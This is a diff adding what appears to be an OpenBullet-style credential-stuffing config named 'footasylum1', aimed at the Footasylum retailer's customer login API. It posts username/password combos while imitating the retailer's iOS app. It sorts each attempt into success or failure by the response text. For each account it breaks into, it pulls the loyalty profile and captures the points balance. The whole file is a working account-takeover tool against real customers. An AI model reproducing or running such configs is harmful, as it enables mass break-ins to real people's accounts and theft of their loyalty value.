@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "footasylum1",
+  "SuggestedBots": 1,
+  "LastModified": "2019-02-26T09:39:17.1712+07:00",
+  "AdditionalInfo": "",
+  "Author": "synqz",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://r9udv3ar7g.execute-api.eu-west-2.amazonaws.com/prod/customer/auth" AutoRedirect=TRUE 
+  CONTENT "{\"fascia_id\":\"1\",\"channel_id\":\"3\",\"customer\":{\"email\":\"<USER>\",\"customer_id\":\"897793C89F5A44FAAE44F7B0D43DD7F4\",\"password\":\"<PASS>\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Footasylum/723 CFNetwork/897.15 Darwin/17.5.0" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "\"code\": \"success\"" 
+  KEYCHAIN Failure OR 
+    KEY "\"detail\": \"Invalid user name / password\"" 
+PARSE "<SOURCE>" LR "sessionID\": \"" "\"," Recursive=FALSE -> VAR "authID" "" "" 
+PARSE "<SOURCE>" LR "customer_id\": " "\"," Recursive=FALSE -> VAR "authID1" "" "" 
+REQUEST POST "http://apiv2.asylumapi.com/api/v1/unlockd/profile/fromid" AutoRedirect=TRUE 
+  CONTENT "{\"id\":\"<authID1>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Footasylum/723 CFNetwork/897.15 Darwin/17.5.0" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "token\":null,\"points\":" ",\"pendingpoints\":0,\"pointsToNextLevel" Recursive=FALSE -> CAP "points" "" "" 
